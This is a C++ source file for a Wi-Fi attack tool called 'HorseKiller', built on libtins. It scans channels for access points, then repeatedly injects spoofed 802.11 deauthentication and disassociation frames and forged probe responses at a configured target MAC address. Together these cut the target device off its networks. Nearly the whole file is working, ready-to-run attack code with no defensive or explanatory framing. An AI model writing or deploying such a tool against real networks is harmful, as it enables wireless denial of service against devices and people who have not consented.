#include <cassert>
#include <chrono>
#include <fstream>
#include <iostream>
#include <map>
#include <memory>
#include <mutex>
#include <string>
#include <thread>
#include <tins/tins.h>
#include <unistd.h>

#include <AccessPointManager.hpp>
#include <Configuration.hpp>

extern "C"
{
#include <80211Wrapper.h>
}

using namespace Tins;
using namespace std;

// include/net/ieee80211_radiotap.h

enum ieee80211_radiotap_tx_flags
{
	IEEE80211_RADIOTAP_F_TX_FAIL = 0x0001,
	IEEE80211_RADIOTAP_F_TX_CTS = 0x0002,
	IEEE80211_RADIOTAP_F_TX_RTS = 0x0004,
	IEEE80211_RADIOTAP_F_TX_NOACK = 0x0008,
	IEEE80211_RADIOTAP_F_TX_NOSEQNO = 0x0010,
	IEEE80211_RADIOTAP_F_TX_ORDER = 0x0020,
};

void injectPacket(PDU *pdu, pcap_t *handle)
{
	auto pkt = pdu->serialize();

	if (pcap_inject(handle, &pkt[0], pkt.size()) == -1)
	{
		std::cerr << "Error injecting packet... [ " << pcap_geterr(handle) << " ]" << std::endl;
	}
}

auto deauthFactory(HWAddress<6> target_mac, HWAddress<6> source_mac, int channel)
{
	Dot11Deauthentication deauth;
	deauth.reason_code(0x07);

	deauth.addr1(target_mac);	  // set device mac address
	deauth.addr2(source_mac);	  // set ap mac address
	deauth.addr3(deauth.addr2()); // set bssid (optional)

	deauth.reason_code(1);

	RadioTap radio = RadioTap() / deauth; // make 802.11 packet

	radio.channel(ieee80211_channel_to_frequency(channel, channel <= 14 ? NL80211_BAND_2GHZ : NL80211_BAND_5GHZ),
				  channel <= 14 ? RadioTap::ChannelType::TWO_GZ : RadioTap::ChannelType::FIVE_GZ);

	radio.tx_flags(IEEE80211_RADIOTAP_F_TX_NOACK);

	return radio;
}

class HorseKiller
{

	bool sniffing;
	bool running;

	int round = 0;
	int now_channel_idx = 0;

	std::string nif;
	const Configuration &config;
	AccessPointManager apm;

	std::map<int, int> channel_ap_num;

	std::thread sniff_loop, packet_sender_loop;
	PacketSender sender;

	std::map<HWAddress<6>, std::string> bssids;
	std::mutex bssids_lock;

	std::optional<Sniffer> psniffer;

public:
	HorseKiller(std::string interface,
				const Configuration &config)
		: sniffing(false), running(false), nif(interface), config(config), apm(config)
	{
	}

	void inject_loop()
	{
		for (; running; round++)
		{
			auto channel_aps = apm.getAPs();

			if (round < config.scan_round)
				for (auto channel : config.channels)
					channel_aps[channel].size();

			for (auto &[channel, aps] : channel_aps)
			{
				sniffing = true;

				std::cout << channel << std::endl;
				std::cout.flush();

				setChannel(nif.c_str(), channel, "");

				auto prev_switch_time = std::chrono::high_resolution_clock::now();

				bool mark = true;

				while (mark)
				{
					auto elapsed_time = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::high_resolution_clock::now() - prev_switch_time);

					if (sniffing && elapsed_time > std::chrono::milliseconds(config.scan_stage_channel_time))
					{
						sniffing = false;
					}
					if (elapsed_time > std::chrono::milliseconds(config.attack_stage_channel_time))
					{
						mark = false;
						break;
					}

					for (auto ap : aps)
					{
						auto elapsed_time = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::high_resolution_clock::now() - prev_switch_time);

						if (sniffing && elapsed_time > std::chrono::milliseconds(config.scan_stage_channel_time))
						{
							sniffing = false;
						}

						if (elapsed_time > std::chrono::milliseconds(config.attack_stage_channel_time))
						{
							mark = false;
							break;
						}

						{
							Dot11Deauthentication deauth;
							deauth.reason_code(0x07);

							deauth.addr1(config.target_mac); // set device mac address
							deauth.addr2(ap.bssid);			 // set ap mac address
							deauth.addr3(deauth.addr2());	 // set bssid (optional)

							RadioTap radio = RadioTap() / deauth; // make 802.11 packet

							radio.channel(ieee80211_channel_to_frequency(channel, channel <= 14 ? NL80211_BAND_2GHZ : NL80211_BAND_5GHZ),
										  channel <= 14 ? RadioTap::ChannelType::TWO_GZ : RadioTap::ChannelType::FIVE_GZ);

							radio.tx_flags(IEEE80211_RADIOTAP_F_TX_NOACK);

							injectPacket(&radio, psniffer->get_pcap_handle());
						}

						{
							Dot11Disassoc disassoc;
							disassoc.reason_code(0x01);

							disassoc.addr1(config.target_mac); // set device mac address
							disassoc.addr2(ap.bssid);			 // set ap mac address
							disassoc.addr3(disassoc.addr2());	 // set bssid (optional)

							RadioTap radio = RadioTap() / disassoc; // make 802.11 packet

							radio.channel(ieee80211_channel_to_frequency(channel, channel <= 14 ? NL80211_BAND_2GHZ : NL80211_BAND_5GHZ),
										  channel <= 14 ? RadioTap::ChannelType::TWO_GZ : RadioTap::ChannelType::FIVE_GZ);

							radio.tx_flags(IEEE80211_RADIOTAP_F_TX_NOACK);

							injectPacket(&radio, psniffer->get_pcap_handle());
						}

						if (ap.resp)
							for (int i = 0; i < 4; i++)
							{
								auto &resp = *ap.resp;

								auto addr = resp.addr2();
								addr[5] = addr[5] * 61 + 2;
								resp.addr1(config.target_mac);
								resp.addr2(addr);
								resp.addr3(addr);

								RadioTap radio = RadioTap() / resp; // make 802.11 packet
								radio.tx_flags(IEEE80211_RADIOTAP_F_TX_NOACK);

								injectPacket(&radio, psniffer->get_pcap_handle());
							}

						// std::this_thread::sleep_for(std::chrono::milliseconds(2));
					}
				}
			}
		}
	}

	bool loop_func()
	{

		for (; running;)
		{
			while (sniffing)
			{
				auto pkt = psniffer->next_packet();

				auto &pdu = *pkt.pdu();

				if (Dot11Beacon *beacon = pdu.find_pdu<Dot11Beacon>())
				{
					auto bssid = beacon->addr2();

					auto tap = pdu.find_pdu<RadioTap>();
					auto signal_dbm = (signed)tap->dbm_signal();
					auto channel = ieee80211_frequency_to_channel((signed)tap->channel_freq());
					auto essid = beacon->ssid();
					apm.update(bssid, essid, channel, signal_dbm);
				}

				if (Dot11ProbeResponse *response = pdu.find_pdu<Dot11ProbeResponse>())
				{
					apm.addResponse(response);
				}

				delete pkt.pdu();
			}

			std::this_thread::sleep_for(std::chrono::milliseconds(10));
		}

		return true;
	}

	void start()
	{
		running = true;

		SnifferConfiguration conf;
		conf.set_immediate_mode(true);
		// conf.set_rfmon(true);
		psniffer = Sniffer(nif, conf);

		packet_sender_loop = std::thread([this]() -> void {
			inject_loop();
		});

		sniff_loop = std::thread([this]() -> void { loop_func(); });
	}

	void join()
	{
		if (sniff_loop.joinable())
			sniff_loop.join();

		if (packet_sender_loop.joinable())
			packet_sender_loop.join();
	}
};

int main(int argc, char *argv[])
{
	if (argc != 3)
	{
		cout << "Usage: " << argv[0] << " <interface> <configuration>" << endl;
		return -1;
	}

	std::string nif = argv[1];
	std::string yaml_filename = argv[2];

	YAML::Node configYAML = YAML::LoadFile(yaml_filename);

	Configuration config = configYAML.as<Configuration>();

	HorseKiller killer(nif, config);

	killer.start();

	killer.join();
}